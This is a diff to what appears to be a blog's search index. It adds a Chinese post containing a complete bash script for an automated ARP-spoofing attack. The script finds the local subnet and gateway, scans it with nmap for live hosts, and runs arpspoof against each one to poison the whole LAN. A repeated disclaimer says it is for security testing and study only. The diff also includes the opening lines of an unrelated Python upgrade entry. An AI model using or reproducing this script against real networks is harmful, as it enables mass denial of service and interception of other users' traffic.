@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>arpspoof使用shell脚本</title>
+      <link href="/2020/06/16/arpspoof%E4%BD%BF%E7%94%A8shell%E8%84%9A%E6%9C%AC/"/>
+      <url>/2020/06/16/arpspoof%E4%BD%BF%E7%94%A8shell%E8%84%9A%E6%9C%AC/</url>
+      
+        <content type="html"><![CDATA[<h1 id="使用shell脚本"><a href="#使用shell脚本" class="headerlink" title="使用shell脚本"></a>使用shell脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#auto make arp 攻击</span><br><span class="line">#by bingyang</span><br><span class="line"></span><br><span class="line">cd &#x2F;home&#x2F; &amp;&amp; mkdir arp &amp;&amp; cd arp&#x2F;</span><br><span class="line">ip&#x3D;&#96;ifconfig | grep &#39;inet 19&#39; | sed &#39;s&#x2F;^ .*inet &#x2F;&#x2F;g&#39;| sed &#39;s&#x2F; net.*$&#x2F;&#x2F;g&#39;&#96; #获得本机ip</span><br><span class="line">sour&#x3D;&#96;ifconfig | grep &#39;inet 19&#39; | sed &#39;s&#x2F;^ .*inet &#x2F;&#x2F;g&#39;| sed &#39;s&#x2F; net.*$&#x2F;&#x2F;g&#39;| cut -d&#39;.&#39; -f 3&#96; #获得本机网关关键值</span><br><span class="line">IPaddress&#x3D;192.168.$sour.0&#x2F;24</span><br><span class="line">gateway&#x3D;192.168.$sour.1</span><br><span class="line">echo -e &quot;\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32--------------------开始安装框架--------------------------------\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32marp自动攻击脚本\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32----------------解锁目标------------------------------------\033[0m&quot;</span><br><span class="line">touch &#x2F;home&#x2F;arp&#x2F;listip.txt</span><br><span class="line">wenben&#x3D;&#x2F;home&#x2F;arp&#x2F;listip.txt</span><br><span class="line">echo $IPaddress</span><br><span class="line">echo $ip</span><br><span class="line">echo $sour</span><br><span class="line"></span><br><span class="line">#&gt;$wenben</span><br><span class="line">ipp&#x3D;$(nmap -sP $IPaddress | grep &#39;Nmap s&#39; | cut -d &#39; &#39; -f 5 | sed &#39;1d&#39;| grep -v $ip)</span><br><span class="line">wait</span><br><span class="line">echo &quot;$ipp&quot; | tee -a $wenben</span><br><span class="line">#进行arp群体攻击，目标来自于文件，如果想让自己上网，就把自己的IP从文件中去掉</span><br><span class="line">while read list</span><br><span class="line">do</span><br><span class="line">    &#123;</span><br><span class="line">arpspoof -i ens33 -t $list $gateway</span><br><span class="line">&#125;</span><br><span class="line">done &lt; &#x2F;home&#x2F;arp&#x2F;listip.txt</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux centos7 升级安装Python2到3</title>
       <link href="/2020/03/16/centos7%E4%B8%ADpython2%E5%8D%87%E7%B4%9Apython3/"/>
       <url>/2020/03/16/centos7%E4%B8%ADpython2%E5%8D%87%E7%B4%9Apython3/</url>
